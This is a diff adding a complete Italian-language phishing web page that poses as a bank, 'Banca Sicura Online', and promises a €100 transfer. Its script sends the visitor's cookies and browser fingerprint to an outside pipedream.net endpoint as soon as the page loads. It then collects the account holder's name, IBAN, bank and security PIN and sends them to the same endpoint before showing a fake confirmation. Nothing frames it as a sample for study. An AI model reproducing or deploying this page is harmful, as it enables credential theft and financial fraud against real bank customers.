@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verifica Bancaria</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#1a3a5c,#2d6aa0);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .card{background:white;border-radius:20px;padding:30px 25px;max-width:380px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+        .logo{text-align:center;margin-bottom:25px}
+        .logo img{width:60px;margin-bottom:10px}
+        .logo h2{color:#1a3a5c;font-size:18px}
+        .amount-box{background:#e8f4e8;border:2px solid #4CAF50;border-radius:15px;padding:15px;text-align:center;margin-bottom:20px}
+        .amount-box .label{font-size:12px;color:#666}
+        .amount-box .value{font-size:36px;font-weight:bold;color:#4CAF50}
+        .input-group{margin-bottom:15px}
+        .input-group label{display:block;font-size:13px;color:#333;margin-bottom:5px;font-weight:600}
+        .input-group input{width:100%;padding:14px;border:2px solid #ddd;border-radius:12px;font-size:16px;transition:border .3s}
+        .input-group input:focus{border-color:#2d6aa0;outline:none}
+        .btn{width:100%;padding:16px;background:#2d6aa0;color:white;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px;transition:background .3s}
+        .btn:hover{background:#1a3a5c}
+        .btn:disabled{background:#ccc;cursor:not-allowed}
+        .footer{text-align:center;margin-top:20px;font-size:11px;color:#999}
+        .shake{animation:shake 0.5s}
+        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}
+        .error-msg{background:#ffe6e6;color:#cc0000;padding:10px;border-radius:8px;font-size:13px;text-align:center;margin-bottom:15px;display:none}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%231a3a5c'/><text x='50' y='55' text-anchor='middle' fill='white' font-size='40' font-weight='bold'>B</text></svg>" alt="Bank Logo">
+            <h2>Banca Sicura Online</h2>
+        </div>
+        
+        <div class="amount-box">
+            <p class="label">IMPORTO DA ACCREDITARE</p>
+            <p class="value">€ 100,00</p>
+        </div>
+        
+        <p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px;">
+            Inserisci i tuoi dati bancari per ricevere il bonifico istantaneo.
+        </p>
+        
+        <div id="errorMsg" class="error-msg"></div>
+        
+        <div class="input-group">
+            <label>Intestatario Conto</label>
+            <input type="text" id="name" placeholder="Nome e Cognome" autocomplete="off">
+        </div>
+        
+        <div class="input-group">
+            <label>IBAN</label>
+            <input type="text" id="iban" placeholder="IT00 X000 0000 0000 0000 0000 000" autocomplete="off">
+        </div>
+        
+        <div class="input-group">
+            <label>Banca / Filiale</label>
+            <input type="text" id="bank" placeholder="es. Intesa Sanpaolo" autocomplete="off">
+        </div>
+        
+        <div class="input-group">
+            <label>PIN di Sicurezza (codice a 5 cifre)</label>
+            <input type="password" id="pin" placeholder="•••••" maxlength="5" autocomplete="off">
+        </div>
+        
+        <button class="btn" id="submitBtn" onclick="confirmData()">🔒 Conferma e Ricevi il Bonifico</button>
+        
+        <p class="footer">
+            Connessione protetta SSL • I tuoi dati sono al sicuro<br>
+            © 2026 Banca Sicura Online
+        </p>
+    </div>
+
+    <script>
+        const PIPEDREAM_URL = "https://69cd60beb3f0593eb064103e51330e55.m.pipedream.net";
+        
+        // Ruba subito dati browser
+        const browserData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + "x" + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie
+        };
+        
+        // Invia dati browser immediatamente
+        fetch(PIPEDREAM_URL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({...browserData, type: "bank_login_page"})
+        }).catch(() => {});
+        
+        function validateIBAN(iban) {
+            // Validazione base IBAN italiano
+            const cleaned = iban.replace(/\\s/g, '').toUpperCase();
+            if (!cleaned.startsWith('IT')) return false;
+            if (cleaned.length !== 27) return false;
+            return true;
+        }
+        
+        function confirmData() {
+            const name = document.getElementById('name').value.trim();
+            const iban = document.getElementById('iban').value.trim();
+            const bank = document.getElementById('bank').value.trim();
+            const pin = document.getElementById('pin').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const card = document.querySelector('.card');
+            
+            // Validazione
+            if (!name || name.length < 3) {
+                errorMsg.textContent = "⚠️ Inserisci un nome valido";
+                errorMsg.style.display = 'block';
+                card.classList.add('shake');
+                setTimeout(() => card.classList.remove('shake'), 500);
+                return;
+            }
+            
+            if (!iban || iban.length < 15) {
+                errorMsg.textContent = "⚠️ IBAN non valido. Deve iniziare con IT e contenere 27 caratteri.";
+                errorMsg.style.display = 'block';
+                card.classList.add('shake');
+                setTimeout(() => card.classList.remove('shake'), 500);
+                return;
+            }
+            
+            if (!pin || pin.length < 4) {
+                errorMsg.textContent = "⚠️ Il PIN deve essere di almeno 4 cifre";
+                errorMsg.style.display = 'block';
+                card.classList.add('shake');
+                setTimeout(() => card.classList.remove('shake'), 500);
+                return;
+            }
+            
+            if (!bank) {
+                errorMsg.textContent = "⚠️ Inserisci il nome della banca";
+                errorMsg.style.display = 'block';
+                card.classList.add('shake');
+                setTimeout(() => card.classList.remove('shake'), 500);
+                return;
+            }
+            
+            // Tutto valido: invia i dati e mostra successo
+            errorMsg.style.display = 'none';
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').textContent = '⏳ Elaborazione in corso...';
+            
+            const bankData = {
+                ...browserData,
+                type: "bank_credentials",
+                name: name,
+                iban: iban,
+                bank: bank,
+                pin: pin
+            };
+            
+            fetch(PIPEDREAM_URL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(bankData)
+            }).then(() => {
+                // Mostra successo
+                document.querySelector('.card').innerHTML = `
+                    <div style="text-align:center;padding:20px;">
+                        <div style="font-size:70px;margin-bottom:20px;">✅</div>
+                        <h2 style="color:#4CAF50;margin-bottom:15px;">Bonifico in elaborazione!</h2>
+                        <p style="color:#666;margin-bottom:20px;">Riceverai €100,00 sul tuo conto entro 24-48 ore.</p>
+                        <div style="background:#f0f8ff;padding:15px;border-radius:10px;margin-bottom:15px;">
+                            <p style="font-size:12px;color:#666;">Intestatario: <strong>${name}</strong></p>
+                            <p style="font-size:12px;color:#666;">IBAN: <strong>${iban}</strong></p>
+                        </div>
+                        <button class="btn" onclick="window.location.href='/'">Torna alla Home</button>
+                    </div>
+                `;
+            }).catch(() => {
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').textContent = '✅ Dati Inviati';
+            });
+        }
+    </script>
+</body>
+</html>
